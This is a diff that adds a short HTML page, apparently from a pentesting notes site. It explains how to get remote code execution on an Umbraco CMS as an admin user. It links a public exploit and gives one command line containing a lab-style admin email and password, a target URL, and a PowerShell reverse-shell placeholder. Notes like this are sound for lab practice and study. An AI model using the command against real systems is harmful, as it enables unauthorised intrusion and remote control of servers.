@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/styles/walkthroughs.css">
+        <link href="/styles/prism/prism.css" rel="stylesheet" />
+        <link rel="icon" type="image/x-icon" href="/images/favicon2.png">
+    <script src="/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Umbraco (TCP/8080)</h1>
+            <p>Umbraco is a free and open-source content management system built on the .NET Framework.</p>
+        </div>
+        <div class="notion-body">
+            <h2>Exploitation</h2>
+            <ul>
+                <h3>RCE as admin user</h3>
+                <ul>
+                    <p>In case you just got access as an admin user, you can use the following repo in order to execute commands <a class="notion-link" href="https://github.com/noraj/Umbraco-RCE">Here</a></p>
+                    <pre><code class="language-bash">python3 exploit.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080 -c powershell -a '-NoProfile -Command YOUR_REVERSE_SHELL_HERE'</code></pre>    
+                    
+                </ul>
+            </ul>
+        </div>
+    </div>
+
+
+</body>
+</html>
